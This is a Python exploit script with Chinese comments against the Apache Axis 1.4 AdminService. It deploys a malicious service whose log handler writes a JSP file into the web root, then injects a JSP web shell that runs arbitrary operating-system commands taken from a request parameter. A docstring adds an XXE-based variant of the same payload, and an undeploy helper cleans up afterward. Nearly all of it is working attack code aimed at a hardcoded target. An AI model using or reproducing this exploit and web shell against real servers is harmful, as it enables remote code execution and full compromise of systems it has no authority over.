# -*- coding:utf-8 -*-
# Written by hacden 2020/10/13
# Axis 1.4 adminservice开启远程访问下可新建服务执行任意方法
# 存在xxe时，例如寻找到operation名称aaaaaaaaaaaaaaaaaa，operation属性名称bbbbbbbbbbb，使用post如下payload创建service，注意请求头加上SOAPAction:否则包no header错误
"""
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:web="http://127.0.0.1"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
       <soapenv:Header/>
       <soapenv:Body>
          <web:aaaaaaaaaaaaaaaaaa soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
             <bbbbbbbbbbb xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY  &˲0xxe SYSTEM &quot;http://127.0.0.1/axis/services/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx?method=!--%3E%3Cns1%3Adeployment%0A%20%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%0A%20%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%0A%20%20xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%0A%20%20%3Cns1%3Aservice%20name%3D%22rceservice%22%20provider%3D%22java%3ARPC%22%3E%0A%20%20%20%20%3CrequestFlow%3E%0A%20%20%20%20%20%20%3Chandler%20type%3D%22RandomLog%22%2F%3E%0A%20%20%20%20%3C%2FrequestFlow%3E%0A%20%20%20%20%3Cns1%3Aparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%2F%3E%0A%20%20%20%20%3Cns1%3Aparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%0A%20%20%3C%2Fns1%3Aservice%3E%0A%20%20%3Chandler%20name%3D%22RandomLog%22%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%0A%20%20%20%20%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22..%2Fwebapps%2FROOT%2Fshell.jsp%22%20%2F%3E%0A%20%20%20%20%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%0A%20%20%3C%2Fhandler%3E%0A%3C%2Fns1%3Adeployment&quot;&gt;%xxe;]&gt;</bbbbbbbbbbb>
          </web:aaaaaaaaaaaaaaaaaa>
       </soapenv:Body>
    </soapenv:Envelope>
最后post请求：
<?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0><![CDATA[
<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
]]>
            </api:in0>
        </api:main>
  </soapenv:Body>
</soapenv:Envelope>
"""

import  requests
import string
import random

requests.packages.urllib3.disable_warnings()
def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def doit(url,rand_str):
    shell='''<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns1:deployment
  xmlns="http://xml.apache.org/axis/wsdd/"
  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
  xmlns:ns1="http://xml.apache.org/axis/wsdd/">
  <ns1:service name="{}" provider="java:RPC">
    <requestFlow>
      <handler type="RandomLog"/>
    </requestFlow>
    <ns1:parameter name="className" value="java.util.Random"/>
    <ns1:parameter name="allowedMethods" value="*"/>
  </ns1:service>
  <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
    <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" /> 
    <parameter name="LogHandler.writeToConsole" value="false" /> 
  </handler>
</ns1:deployment>
  </soapenv:Body>
</soapenv:Envelope>'''.format(rand_str)
    write='''<?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0><![CDATA[
<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%>
]]>
            </api:in0>
        </api:main>
  </soapenv:Body>
</soapenv:Envelope>'''
    d = requests.post(url+"/services/AdminService",verify=False,timeout=5,headers={"Content-Type":"application/xml","SOAPAction":"xxxx"},data=shell)
    if b'processing</Admin>' in d.content:
        print("deploy service finished!")
    else:
        print("may be not vulnerable!!")
    requests.post(url+"/services/%s"%rand_str, verify=False,timeout=5,
                  headers={"Content-Type": "application/xml", "SOAPAction": "xxxx"}, data=write)

    ret=requests.get(url+"../shell.jsp",verify=False)
    if ret.status_code==200:
        print("you got shell: "+url+"../shell.jsp")
    else:
        print("try it yourself !!")
def under_service(url,under_str):
    under_shell = '''<?xml version="1.0" encoding="utf-8"?>
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Body>
        <ns1:undeployment
      xmlns="http://xml.apache.org/axis/wsdd/"
      xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"
      xmlns:ns1="http://xml.apache.org/axis/wsdd/">
      <ns1:service name="{}" provider="java:RPC">
        <requestFlow>
          <handler type="RandomLog"/>
        </requestFlow>
        <ns1:parameter name="className" value="java.util.Random"/>
        <ns1:parameter name="allowedMethods" value="*"/>
      </ns1:service>
      <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >  
        <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" /> 
        <parameter name="LogHandler.writeToConsole" value="false" /> 
      </handler>
    </ns1:undeployment>
      </soapenv:Body>
    </soapenv:Envelope>'''.format(under_str)
    d = requests.post(url + "/services/AdminService", verify=False, timeout=5,
                      headers={"Content-Type": "application/xml", "SOAPAction": "xxxx"}, data=under_shell)
    if b'processing</Admin>' in d.content:
        print("under service finished!")
if  __name__ == "__main__":
    rand_str = random_string(8)
    url = "http://192.168.43.99:8080/axis/"
    # under_service(url,"jmgnpjbs")
    # exit()
    doit(url,rand_str)

